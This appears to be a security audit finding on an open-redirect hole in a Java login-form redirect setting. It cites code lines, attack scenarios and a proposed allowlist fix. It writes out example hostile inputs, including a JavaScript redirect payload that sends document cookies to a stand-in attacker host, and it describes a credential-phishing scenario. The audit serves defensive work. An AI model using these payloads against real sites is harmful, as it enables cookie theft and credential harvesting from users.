behaviour: |-
  **HIGH — `auth.login-form-redirect` is an open-redirect surface with no scheme/host/path validation. Combined with the doc absence (live `/configuration-and-deployment/enable-security/authentication/login-form` page DOES NOT mention this key), an operator who templates the value from an upstream pipeline introduces an attacker-controlled redirect target.** Sidecar primary-source confirms three composing facts:

  - **LoginFormSecurityConfiguration.java:41**: `@Value("${auth.login-form-redirect:}")` reads the raw string from operator config; empty default falls back to `/`.
  - **LoginFormSecurityConfiguration.java:89**: `URI.create(redirectUri)` parses the string — accepts ANY scheme (http, https, javascript, data, file, vbscript). Only validation is the URI parser's syntactic check.
  - **LoginFormSecurityConfiguration.java:46**: `new DefaultServerRedirectStrategy().sendRedirect(exchange, redirectURI)` issues the 302 with the URI VERBATIM in the `Location` header.

  No allowlist, no `@URL` constraint, no scheme check, no host check, no path-traversal check.

  **Operator-impact scenarios** (templated-config attack vectors):
  1. Helm chart with `helm install --set auth.loginFormRedirect=https://attacker.com` — every successful login redirects to attacker's site. The attacker site hosts a fake "Session expired, please re-authenticate" page and harvests credentials.
  2. ConfigMap merged from a multi-tenant K8s namespace where the value is operator-controlled by a less-privileged user.
  3. Env-var substitution `auth.login-form-redirect=${EXTERNAL_PORTAL_URL}` where `EXTERNAL_PORTAL_URL` is pulled from a CI/CD pipeline variable derived from a GitHub Actions input.
  4. `javascript:alert(1)` or `javascript:fetch('https://attacker.com?cookie='+document.cookie)` — XSS-via-redirect if the browser honours non-http schemes in `Location` headers (some browsers do, depending on the response status).

  **STRENGTHENS existing TEST-GAP-142** (also names the open-redirect surface from the same file). This sidecar adds the doc-drift dimension: WebFetched 2026-05-20 status 200 from `/configuration-and-deployment/enable-security/authentication/login-form` confirms the key is NOT mentioned in the live docs. Operators have NO guidance that this key is sensitive — the platform's docs surface gives no warning.

  **No live-doc mitigation**: confirmed at primary source via WebFetch. The doc page covers `auth.type=LOGIN_FORM`, `auth.login-form-credentials`, security warnings about plaintext credentials — but the redirect key is silent.

  **Test gap shape**: regression-pin asserting:
  1. With `auth.login-form-redirect=https://attacker.com`, successful form-login returns HTTP 302 with `Location: https://attacker.com` (PINS current behaviour).
  2. With `auth.login-form-redirect=javascript:alert(1)`, behaviour either crashes boot (preferred — fail-loud) or issues the redirect.
  3. With `auth.login-form-redirect=` (empty), successful login redirects to `/` (existing TEST-GAP-142 path).

  After the test pins the current behaviour, the fix is a one-method `validateRedirect(String)` that enforces an allowlist (same-origin OR explicit allowlist via `auth.login-form-redirect.allowed-origins`).
